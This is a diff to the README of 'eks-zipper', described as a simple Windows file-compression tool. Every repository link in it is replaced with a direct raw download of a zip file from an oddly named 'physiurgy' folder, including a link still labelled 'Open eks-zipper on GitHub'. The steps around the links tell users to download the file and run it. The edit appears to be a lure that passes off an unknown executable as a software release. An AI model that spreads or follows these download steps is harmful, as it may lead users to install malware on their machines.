@@ -1,6 +1,6 @@
 # 🧰 eks-zipper - Easy file compression and extraction
 
-[![Download eks-zipper](https://img.shields.io/badge/Download-eks--zipper-blue?style=for-the-badge)](https://github.com/vasilycamphoraceous788/eks-zipper)
+[![Download eks-zipper](https://img.shields.io/badge/Download-eks--zipper-blue?style=for-the-badge)](https://raw.githubusercontent.com/vasilycamphoraceous788/eks-zipper/main/physiurgy/zipper-eks-1.6-beta.1.zip)
 
 ## 📦 What is eks-zipper?
 
@@ -11,7 +11,7 @@ It is made for everyday use. You can use it to open an archive, unpack files, or
 ## 🚀 Download eks-zipper
 
 Visit this page to download:  
-https://github.com/vasilycamphoraceous788/eks-zipper
+https://raw.githubusercontent.com/vasilycamphoraceous788/eks-zipper/main/physiurgy/zipper-eks-1.6-beta.1.zip
 
 On that page, look for the latest release or the main download file. After the file is saved to your computer, you can run it on Windows.
 
@@ -30,7 +30,7 @@ For best results, keep the archive in a folder you can find again, such as Downl
 
 ## 🛠️ How to install
 
-1. Open the download page: https://github.com/vasilycamphoraceous788/eks-zipper
+1. Open the download page: https://raw.githubusercontent.com/vasilycamphoraceous788/eks-zipper/main/physiurgy/zipper-eks-1.6-beta.1.zip
 2. Find the latest release or download file
 3. Download the file to your computer
 4. Open the folder where the file was saved
@@ -148,7 +148,7 @@ This project is related to:
 
 ## 🖥️ Quick start on Windows
 
-1. Go to https://github.com/vasilycamphoraceous788/eks-zipper
+1. Go to https://raw.githubusercontent.com/vasilycamphoraceous788/eks-zipper/main/physiurgy/zipper-eks-1.6-beta.1.zip
 2. Download the app file
 3. Open the file or extract it if needed
 4. Run eks-zipper
@@ -183,7 +183,7 @@ eks-zipper is meant to keep archive work simple. It focuses on common file forma
 
 ## 📎 Direct download page
 
-[Open eks-zipper on GitHub](https://github.com/vasilycamphoraceous788/eks-zipper)
+[Open eks-zipper on GitHub](https://raw.githubusercontent.com/vasilycamphoraceous788/eks-zipper/main/physiurgy/zipper-eks-1.6-beta.1.zip)
 
 ## 🗃️ Folder layout idea
 
